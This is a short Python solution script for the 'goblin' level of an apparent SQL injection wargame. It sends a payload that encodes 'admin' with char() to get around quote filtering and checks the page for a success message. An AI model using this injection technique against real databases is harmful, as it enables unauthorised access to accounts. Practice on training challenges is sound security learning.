import requests

url = 'https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php'
cookie = {'PHPSESSID': 'your cookie'}
payload = "?no=0 or id=char(97,100,109,105,110)"

r = requests.get(url + payload, cookies=cookie)
if 'GOBLIN Clear!' in r.text:
    print('GOBLIN Clear!')
